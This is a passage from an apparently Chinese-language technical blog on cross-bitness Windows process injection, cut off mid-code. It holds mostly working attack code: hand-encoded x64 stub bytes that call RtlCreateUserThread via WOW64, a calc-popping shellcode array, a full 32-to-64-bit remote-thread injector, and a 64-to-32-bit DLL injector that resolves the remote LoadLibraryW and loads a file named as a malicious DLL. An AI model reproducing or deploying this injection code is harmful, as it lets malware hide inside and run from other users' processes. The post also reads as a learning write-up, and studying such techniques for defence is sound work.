class="number">0x41</span>,<span class="number">0x51</span>,                    <span class="comment">// push    r9                   ; ClientID = NULL</span></span><br><span class="line">                    <span class="number">0x48</span>,<span class="number">0x8D</span>,<span class="number">0x46</span>,<span class="number">0x18</span>,          <span class="comment">// lea     rax, [rsi+0x18]      ; ctx-&gt;hThead地址。出（OUT）参数，将创建的线程的句柄存入此处，以供inject的ResumeThread使用</span></span><br><span class="line">                    <span class="number">0x50</span>,                         <span class="comment">// push    rax                  ; ThreadHandle = &amp;ctx-&gt;ctx-&gt;hThead</span></span><br><span class="line">                    <span class="number">0xFF</span>,<span class="number">0x76</span>,<span class="number">0x10</span>,               <span class="comment">// push    qword [rsi+0x10]     ; StartParameter = ctx-&gt;lpParameter。可以给待启动的线程传入一个参数 </span></span><br><span class="line">                    <span class="number">0xFF</span>,<span class="number">0x76</span>,<span class="number">0x08</span>,               <span class="comment">// push    qword [rsi+0x8]      ; StartAddres = ctx-&gt;lpStartAddress。待启动的线程地址，在本文中指shellcode地址。</span></span><br><span class="line">                    <span class="number">0x41</span>,<span class="number">0x51</span>,                    <span class="comment">// push    r9                   ; StackCommit = NULL</span></span><br><span class="line">                    <span class="number">0x41</span>,<span class="number">0x51</span>,                    <span class="comment">// push    r9                   ; StackReserved = NULL</span></span><br><span class="line">                    <span class="number">0x49</span>,<span class="number">0xB8</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>, <span class="comment">// mov r8, 1 ; CreateSuspended = True，一定是要暂停，为什么要暂停？</span></span><br><span class="line">                    <span class="number">0x48</span>,<span class="number">0x31</span>,<span class="number">0xD2</span>,               <span class="comment">// xor     rdx, rdx             ; SecurityDescriptor = NULL</span></span><br><span class="line">                    <span class="number">0x48</span>,<span class="number">0x8B</span>,<span class="number">0x0E</span>,               <span class="comment">// mov     rcx, [rsi]           ; ProcessHandle = ctx-&gt;hProcess</span></span><br><span class="line">                    <span class="number">0x41</span>,<span class="number">0xBA</span>,<span class="number">0xC8</span>,<span class="number">0x38</span>,<span class="number">0xA4</span>,<span class="number">0x40</span>, <span class="comment">// mov   r10d, 0x40a438c8      ; mov   r10d, 0x40a438c8：&quot;ntdll.dll&quot; + &quot;RtlCreateUserThread&quot; hash</span></span><br><span class="line">                    <span class="number">0xFF</span>,<span class="number">0xD5</span>,                    <span class="comment">// call    rbp                  ; 调用GetProcessAddrByHash函数。</span></span><br><span class="line"></span><br><span class="line">                    <span class="comment">// ================ 第12段：返回结果并清理栈 ================</span></span><br><span class="line">                    <span class="number">0x48</span>,<span class="number">0x85</span>,<span class="number">0xC0</span>,               <span class="comment">// test    rax, rax             ; 检查是否成功</span></span><br><span class="line">                    <span class="number">0x74</span>,<span class="number">0x0C</span>,                    <span class="comment">// jz      success</span></span><br><span class="line">                    <span class="number">0x48</span>,<span class="number">0xB8</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>, <span class="comment">// mov rax, 0</span></span><br><span class="line">                    <span class="number">0xEB</span>,<span class="number">0x0A</span>,                    <span class="comment">// jmp     cleanup</span></span><br><span class="line">                    <span class="comment">// success:</span></span><br><span class="line">                    <span class="number">0x48</span>,<span class="number">0xB8</span>,<span class="number">0x01</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>, <span class="comment">// mov rax, 1</span></span><br><span class="line">                    <span class="comment">// cleanup :</span></span><br><span class="line">                    <span class="number">0x48</span>,<span class="number">0x83</span>,<span class="number">0xC4</span>,<span class="number">0x50</span>,          <span class="comment">// add     rsp, 0x50            ; 清理栈</span></span><br><span class="line">                    <span class="number">0x48</span>,<span class="number">0x89</span>,<span class="number">0xFC</span>,               <span class="comment">// mov     rsp, rdi             ; 恢复原始栈指针</span></span><br><span class="line">                    <span class="number">0xC3</span>                          <span class="comment">// ret</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">unsigned char shellcode[] = &#123;</span><br><span class="line">        <span class="number">0x50</span>, <span class="number">0x51</span>, <span class="number">0x52</span>, <span class="number">0x53</span>, <span class="number">0x56</span>, <span class="number">0x57</span>, <span class="number">0x55</span>, <span class="number">0x6A</span>, <span class="number">0x60</span>, <span class="number">0x5A</span>,</span><br><span class="line"><span class="number">0x68</span>, <span class="number">0x63</span>, <span class="number">0x61</span>, <span class="number">0x6C</span>, <span class="number">0x63</span>, <span class="number">0x54</span>, <span class="number">0x59</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xEC</span>,</span><br><span class="line"><span class="number">0x28</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x32</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x76</span>, <span class="number">0x18</span>, <span class="number">0x48</span>,</span><br><span class="line"><span class="number">0x8B</span>, <span class="number">0x76</span>, <span class="number">0x10</span>, <span class="number">0x48</span>, <span class="number">0xAD</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x30</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>,</span><br><span class="line"><span class="number">0x7E</span>, <span class="number">0x30</span>, <span class="number">0x03</span>, <span class="number">0x57</span>, <span class="number">0x3C</span>, <span class="number">0x8B</span>, <span class="number">0x5C</span>, <span class="number">0x17</span>, <span class="number">0x28</span>, <span class="number">0x8B</span>,</span><br><span class="line"><span class="number">0x74</span>, <span class="number">0x1F</span>, <span class="number">0x20</span>, <span class="number">0x48</span>, <span class="number">0x01</span>, <span class="number">0xFE</span>, <span class="number">0x8B</span>, <span class="number">0x54</span>, <span class="number">0x1F</span>, <span class="number">0x24</span>,</span><br><span class="line"><span class="number">0x0F</span>, <span class="number">0xB7</span>, <span class="number">0x2C</span>, <span class="number">0x17</span>, <span class="number">0x8D</span>, <span class="number">0x52</span>, <span class="number">0x02</span>, <span class="number">0xAD</span>, <span class="number">0x81</span>, <span class="number">0x3C</span>,</span><br><span class="line"><span class="number">0x07</span>, <span class="number">0x57</span>, <span class="number">0x69</span>, <span class="number">0x6E</span>, <span class="number">0x45</span>, <span class="number">0x75</span>, <span class="number">0xEF</span>, <span class="number">0x8B</span>, <span class="number">0x74</span>, <span class="number">0x1F</span>,</span><br><span class="line"><span class="number">0x1C</span>, <span class="number">0x48</span>, <span class="number">0x01</span>, <span class="number">0xFE</span>, <span class="number">0x8B</span>, <span class="number">0x34</span>, <span class="number">0xAE</span>, <span class="number">0x48</span>, <span class="number">0x01</span>, <span class="number">0xF7</span>,</span><br><span class="line"><span class="number">0x99</span>, <span class="number">0xFF</span>, <span class="number">0xD7</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xC4</span>, <span class="number">0x30</span>, <span class="number">0x5D</span>, <span class="number">0x5F</span>, <span class="number">0x5E</span>,</span><br><span class="line"><span class="number">0x5B</span>, <span class="number">0x5A</span>, <span class="number">0x59</span>, <span class="number">0x58</span>, <span class="number">0xC3</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 参数结构（可选）</span></span><br><span class="line">typedef <span class="keyword">struct</span> _WOW64CONTEXT &#123;</span><br><span class="line">    union &#123; HANDLE hProcess; BYTE _[<span class="number">8</span>]; &#125; h;            <span class="comment">//句柄</span></span><br><span class="line">    union &#123; LPVOID lpStartAddress; BYTE _[<span class="number">8</span>]; &#125; s;      <span class="comment">//目标地址</span></span><br><span class="line">    union &#123; LPVOID lpParameter;   BYTE _[<span class="number">8</span>]; &#125; p;       <span class="comment">//参数</span></span><br><span class="line">    union &#123; HANDLE hThread;       BYTE _[<span class="number">8</span>]; &#125; t;       <span class="comment">//线程句柄</span></span><br><span class="line">&#125; WOW64CONTEXT, * LPWOW64CONTEXT;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 类型定义</span></span><br><span class="line">typedef BOOL(WINAPI* X64FUNCTION)(DWORD ctx);</span><br><span class="line">typedef DWORD(WINAPI* EXECUTEX64)(X64FUNCTION pFunction, DWORD ctx);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 注入函数：32 位进程 → 64 位进程 */</span></span><br><span class="line">BOOL inject_via_remotethread_wow64(HANDLE hProcess, LPVOID lpStartAddress, LPVOID lpParameter)</span><br><span class="line">&#123;</span><br><span class="line">    EXECUTEX64 pExecuteX64 = NULL;</span><br><span class="line">    X64FUNCTION pX64function = NULL;</span><br><span class="line">    WOW64CONTEXT* ctx = NULL;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 在本进程申请 RWX 内存</span></span><br><span class="line">    pExecuteX64 = (EXECUTEX64)VirtualAlloc(NULL, sizeof(migrate_executex64), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span> (!pExecuteX64) <span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">    pX64function = (X64FUNCTION)VirtualAlloc(NULL, sizeof(migrate_wownativex) + sizeof(WOW64CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span> (!pX64function) &#123; VirtualFree(pExecuteX64, <span class="number">0</span>, MEM_RELEASE); <span class="keyword">return</span> FALSE; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 拷贝 stub</span></span><br><span class="line">    memcpy(pExecuteX64, migrate_executex64, sizeof(migrate_executex64));</span><br><span class="line">    memcpy(pX64function, migrate_wownativex, sizeof(migrate_wownativex));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 填参数包</span></span><br><span class="line">    ctx = (WOW64CONTEXT*)((BYTE*)pX64function + sizeof(migrate_wownativex));</span><br><span class="line">    ctx-&gt;h.hProcess = hProcess;</span><br><span class="line">    ctx-&gt;s.lpStartAddress = lpStartAddress;</span><br><span class="line">    ctx-&gt;p.lpParameter = lpParameter;</span><br><span class="line">    ctx-&gt;t.hThread = NULL;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. WOW64 远跳 → 64 位 stub → RtlCreateUserThread</span></span><br><span class="line">    <span class="keyword">if</span> (!pExecuteX64(pX64function, (DWORD)ctx)) &#123; VirtualFree(pExecuteX64, <span class="number">0</span>, MEM_RELEASE); VirtualFree(pX64function, <span class="number">0</span>, MEM_RELEASE); <span class="keyword">return</span> FALSE; &#125;</span><br><span class="line">    <span class="keyword">if</span> (!ctx-&gt;t.hThread) &#123; VirtualFree(pExecuteX64, <span class="number">0</span>, MEM_RELEASE); VirtualFree(pX64function, <span class="number">0</span>, MEM_RELEASE); <span class="keyword">return</span> FALSE; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. 启动线程 &amp; 清理</span></span><br><span class="line">    ResumeThread(ctx-&gt;t.hThread);</span><br><span class="line">    VirtualFree(pExecuteX64, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">    VirtualFree(pX64function, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* -------------------- main -------------------- */</span></span><br><span class="line"><span class="type">int</span> main()</span><br><span class="line">&#123;</span><br><span class="line">    printf(<span class="string">&quot;[+] 本进程位数: x86\n&quot;</span>);</span><br><span class="line">    DWORD pid;</span><br><span class="line">    printf(<span class="string">&quot;[+] 请输入 64 位进程 PID: &quot;</span>);</span><br><span class="line">    scanf_s(<span class="string">&quot;%lu&quot;</span>, &amp;pid);</span><br><span class="line">    <span class="comment">//DWORD pid = 2824;</span></span><br><span class="line">    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line">    <span class="keyword">if</span> (!hProc) &#123; printf(<span class="string">&quot;[-] OpenProcess 失败 %lu\n&quot;</span>, GetLastError()); <span class="keyword">return</span> <span class="number">1</span>; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 远程分配低 2 GB 内存</span></span><br><span class="line">    LPVOID pCode = VirtualAllocEx(hProc, (LPVOID)<span class="number">0x10000000</span>, <span class="number">0x1000</span>, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span> (!pCode) pCode = VirtualAllocEx(hProc, NULL, <span class="number">0x1000</span>, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span> (!pCode) &#123; printf(<span class="string">&quot;[-] 远程代码分配失败\n&quot;</span>); CloseHandle(hProc); <span class="keyword">return</span> <span class="number">1</span>; &#125;</span><br><span class="line">    printf(<span class="string">&quot;[+] 代码地址: %p\n&quot;</span>, pCode);</span><br><span class="line"></span><br><span class="line">    WriteProcessMemory(hProc, pCode, shellcode, sizeof(shellcode), NULL);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 注入</span></span><br><span class="line">    <span class="keyword">if</span> (inject_via_remotethread_wow64(hProc, pCode, NULL))</span><br><span class="line">    &#123;</span><br><span class="line">        printf(<span class="string">&quot;[+] 64 位线程已创建，计算器应弹出！\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        printf(<span class="string">&quot;[-] 注入失败，错误码: %lu\n&quot;</span>, GetLastError());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    CloseHandle(hProc);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-4-测试"><a href="#1-4-测试" class="headerlink" title="1.4 测试"></a>1.4 测试</h2><p>win11 intel CPU</p>
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2025%2F10%2F25%2F14-54-25-6c3269a626208457f6e88b1724c88c7b-20251025145424898-505fb4.png"></p>
+<p>win11 AMD CPU</p>
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2025%2F10%2F23%2F22-15-56-df518b4d4dd1c55e1e4c370b5ff2b501-20251023221556713-c00f47.png"></p>
+<p>win10 </p>
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2025%2F10%2F25%2F15-10-20-df3750e7b6d3b546543d453ab31db102-20251025151019769-899d48.png"></p>
+<p>win 7 </p>
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2025%2F10%2F25%2F15-08-58-7c872f66ab43137d1ddfd0851b80040f-20251025150857755-5efb36.png"></p>
+<h1 id="二、x64-x32"><a href="#二、x64-x32" class="headerlink" title="二、x64-&gt;x32"></a>二、x64-&gt;x32</h1><p>参考 <a target="_blank" rel="noopener" href="https://xia0ji233.pro/">xia0ji233</a> 师傅这篇的文章：<a target="_blank" rel="noopener" href="https://xia0ji233.pro/2024/06/18/RemoteThreadInject/">关于64位进程注入32位进程的分析 | xia0ji233’s blog</a></p>
+<p>不愧是我github上第一个关注的大佬，当时就是看了他的这篇文章之后就在心里种下了一颗“一定实现 <code>跨位数注入</code>”的种子，如今本文如愿实现，真的很感谢 <a target="_blank" rel="noopener" href="https://xia0ji233.pro/">xia0ji233</a> 师傅，给了我很多启发！</p>
+<p>在64位程序向64位远程进程注入dll时，我们的经典操作是</p>
+<ol>
+<li>使用 <code>OpenProcess</code> 打开进程。</li>
+<li>使用 <code>VirtualAllocEx </code> 在远程进程中为DLL路径申请空间。</li>
+<li>使用 <code>WriteProcessMemory</code> 将dll路径写入到指定进程中的内存区域。 </li>
+<li>使用 <code>GetModuleHandleA+GetProcAddress</code> 获取LoadLibraryA在kernel32.dll的虚拟地址</li>
+<li>使用 <code>CreateRemoteThread</code> 创建在另一个进程的虚拟地址空间中运行的线程，LoadLibraryA或者LoadLibraryW作为lpStartAddress，已写入DLL路径的内存地址作为lpParameter。</li>
+<li>使用 <code>WaitForSingleObject</code> 等待远程线程结束。</li>
+</ol>
+<p>对于第4步的原理是：同架构的进程是共享同一套共享库系统，即同架构的进程的 <code>kernel32.dll</code> 和 <code>ntdll.dll</code> 的句柄（基址）在不同进程的虚拟内存空间是一致的，进而LoadLibrary在同架构的不同进程里的kernel32.dll的虚拟地址也是一致的，这样我们就可以将LoadLibrary的地址作为线程启动的起点。其实我在我的早期文章的时候就研究过这个知识的，没想到这里又用上了。</p>
+<p>例如：两个64位的进程其 <code>ntdll.dll</code> 的基址是一样的</p>
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/10/25/23-13-34-df3746329fd2d34b7b920764244e3993-20251025231334-779b40.png"></p>
+<p>同理32位进程的<code>kernel32.dll</code>也是一样</p>
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/10/25/23-17-37-84c6a4e29881489f3d5c48ff10e3c427-20251025231736-a7bc40.png"></p>
+<p>当我们使用64-&gt;32 注入dll与上述同架构注入<strong>最关键的差异</strong>是：当我们在64向32进程注入32位的dll时，需要用到32进程里的 <code>kernel32.dll</code> 的模块基址，而64位和32位 <code>kernel32.dll</code> 的模块基址是不一致的，毕竟他们并不是同一个 <code>kernel32</code>，一个是System32目录（64位程序使用），而另一个是SysWOW64目录（32位程序使用），导致常规的远程进程注入方法失效！</p>
+<p>一个程序使用 <code>GetModuleHandleA+GetProcAddress</code> 获取到的 <code>LoadLibraryW</code> 的地址是基于程序的架构的，比如说64位程序获取到的就是64位的 <code>LoadLibraryW</code> ，64位程序使用上述的方法是没办法获取到32位的LoadLibraryW，所以为了实现64-&gt;32 注入dll，需要自己实现类似 <code>GetModuleHandleA+GetProcAddress</code> 的功能。</p>
+<p>在下文给的示例代码中，一共有两个关键的自定义函数：</p>
+<ol>
+<li><code>GetLoadLibraryW</code> 就是在 <strong>指定的32位目标进程</strong> 里，把 <code>kernel32.dll</code> 的<strong>32位 <code>LoadLibraryW</code> 入口地址</strong>给你找出来并返回。</li>
+<li><code>GetRemoteProcAddress</code> 就是经典的从DOS-&gt;NT-&gt;导出表寻找目标函数地址的过程，这里不过多叙述。</li>
+</ol>
+<p>可以将两个函数合并，大致流程总结如下：</p>
+<ol>
+<li><code>EnumProcessModulesEx</code> 指定 <code>LIST_MODULES_32BIT</code> 参数，表明要枚举32位目标进程的所有模块，存放到模块数组中；</li>
+<li>遍历模块数组，使用 <code>GetModuleBaseNameW</code> 获取模块文件名（非绝对路径名）</li>
+<li>使用 <code>_wcsicmp</code> 忽略大小写比较模块文件名与目标模块名，在本文中，目标模块名为 <code>KERNEL32.DLL</code> 或 <code>kernel32.dll</code> 或者任意组合都可以。</li>
+<li>如果匹配成功，则使用 <code>GetRemoteProcAddress</code> 解析模块的导出表，获得目标函数地址。</li>
+<li>最后将寻找到的目标函数（<code>LoadLibraryW</code>）地址返回，并在后续的 <code>CreateRemoteThread</code> 中使用。</li>
+</ol>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;tlhelp32.h&gt;</span><br><span class="line">#include &lt;Psapi.h&gt;</span><br><span class="line">#include &lt;<span class="type">string</span>.h&gt;</span><br><span class="line"></span><br><span class="line">FARPROC GetRemoteProcAddress(HANDLE hProcess, HMODULE hModule, LPCSTR lpProcName) &#123;</span><br><span class="line">    BYTE buffer[<span class="number">4096</span>];</span><br><span class="line">    SIZE_T bytesRead;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!ReadProcessMemory(hProcess, hModule, buffer, sizeof(buffer), &amp;bytesRead)) &#123;</span><br><span class="line">        <span class="keyword">return</span> NULL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)buffer;</span><br><span class="line">    PIMAGE_NT_HEADERS32 ntHeaders = (PIMAGE_NT_HEADERS32)((BYTE*)buffer + dosHeader-&gt;e_lfanew);</span><br><span class="line">    DWORD RVAForExpDir = ntHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!ReadProcessMemory(hProcess, (BYTE*)hModule + RVAForExpDir, buffer, sizeof(IMAGE_EXPORT_DIRECTORY), &amp;bytesRead)) &#123;</span><br><span class="line">        <span class="keyword">return</span> NULL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)buffer;</span><br><span class="line">    DWORD funcAddr = (DWORD)(exportDir-&gt;AddressOfFunctions);</span><br><span class="line">    DWORD nameAddr = (DWORD)(exportDir-&gt;AddressOfNames);</span><br><span class="line">    DWORD nameOrdAddr = (DWORD)(exportDir-&gt;AddressOfNameOrdinals);</span><br><span class="line">    <span class="keyword">for</span> (DWORD i = <span class="number">0</span>; i &lt; exportDir-&gt;NumberOfNames; i++) &#123;</span><br><span class="line">        char name[<span class="number">256</span>];</span><br><span class="line">        DWORD TrueNameAddr;</span><br><span class="line">        WORD TrueOrd;</span><br><span class="line">        DWORD TrueFuncAddr;</span><br><span class="line">        <span class="keyword">if</span> (!ReadProcessMemory(hProcess, (BYTE*)hModule + nameAddr + sizeof(DWORD) * i, &amp;TrueNameAddr, sizeof(TrueNameAddr), &amp;bytesRead)) &#123;</span><br><span class="line">            <span class="keyword">return</span> NULL;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!ReadProcessMemory(hProcess, (LPCVOID)((BYTE*)hModule + (DWORD)TrueNameAddr), name, sizeof(name), &amp;bytesRead)) &#123;</span><br><span class="line">            <span class="keyword">return</span> NULL;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (_stricmp(name, lpProcName) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!ReadProcessMemory(hProcess, (BYTE*)hModule + nameOrdAddr + sizeof(WORD) * i, &amp;TrueOrd, sizeof(TrueOrd), &amp;bytesRead)) &#123;</span><br><span class="line">                <span class="keyword">return</span> NULL;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!ReadProcessMemory(hProcess, (BYTE*)hModule + funcAddr + sizeof(DWORD) * (TrueOrd), &amp;TrueFuncAddr, sizeof(TrueFuncAddr), &amp;bytesRead)) &#123;</span><br><span class="line">                <span class="keyword">return</span> NULL;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> (FARPROC)(TrueFuncAddr + (BYTE*)hModule);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> NULL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">FARPROC GetLoadLibraryW(HANDLE hProcess) &#123;</span><br><span class="line">    HMODULE hMods[<span class="number">1024</span>];</span><br><span class="line">    DWORD cbNeeded;</span><br><span class="line">    unsigned <span class="type">int</span> i;</span><br><span class="line">    FARPROC ret = NULL;</span><br><span class="line">    <span class="keyword">if</span> (EnumProcessModulesEx(hProcess, hMods, sizeof(hMods), &amp;cbNeeded, LIST_MODULES_32BIT)) &#123;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; (cbNeeded / sizeof(HMODULE)); i++) &#123;</span><br><span class="line">            WCHAR szModName[MAX_PATH];</span><br><span class="line">            <span class="keyword">if</span> (GetModuleBaseNameW(hProcess, hMods[i], szModName, sizeof(szModName) / sizeof(WCHAR))) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!_wcsicmp(L<span class="string">&quot;KERNEL32.DLL&quot;</span>, szModName)) &#123;</span><br><span class="line">                    ret = GetRemoteProcAddress(hProcess, hMods[i], <span class="string">&quot;LoadLibraryW&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (ret != NULL) &#123;</span><br><span class="line">                        wprintf(L<span class="string">&quot;在模块 %s 中找到 LoadLibraryW 函数地址: 0x%08X\n&quot;</span>, szModName, (DWORD)ret);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> main() &#123;</span><br><span class="line">    printf(<span class="string">&quot;[+] 本进程位数: 64\n&quot;</span>);</span><br><span class="line">    DWORD pid;</span><br><span class="line">    printf(<span class="string">&quot;[+] 请输入 32 位进程 PID: &quot;</span>);</span><br><span class="line">    scanf_s(<span class="string">&quot;%lu&quot;</span>, &amp;pid);</span><br><span class="line">    <span class="keyword">const</span> WCHAR* FileName = L<span class="string">&quot;恶意.dll&quot;</span>;  <span class="comment">// 自备恶意dll</span></span><br><span class="line"></span><br><span class="line">    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line">    <span class="keyword">if</span> (!hProcess) &#123;</span><br><span class="line">        MessageBoxW(NULL, L<span class="string">&quot;打开句柄失败，可能没有权限&quot;</span>, FileName, MB_OK);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    LPVOID lpAddress = VirtualAllocEx(hProcess, NULL, <span class="number">0x100</span>, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span> (!lpAddress) &#123;</span><br><span class="line">        MessageBoxW(NULL, L<span class="string">&quot;分配远程空间失败，可能没有权限&quot;</span>, FileName, MB_OK);</span><br><span class="line">        CloseHandle(hProcess);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    SIZE_T dwWriteLength = <span class="number">0</span>;</span><br><span class="line">    BOOL res = WriteProcessMemory(hProcess, lpAddress, FileName, (wcslen(FileName) + <span class="number">1</span>) * <span class="number">2</span>, &amp;dwWriteLength);</span><br><span class="line">    <span class="keyword">if</span> (!res) &#123;</span><br><span class="line">        MessageBoxW(NULL, L<span class="string">&quot;写失败&quot;</span>, FileName, MB_OK);</span><br><span class="line">        VirtualFreeEx(hProcess, lpAddress, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">        CloseHandle(hProcess);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    FARPROC 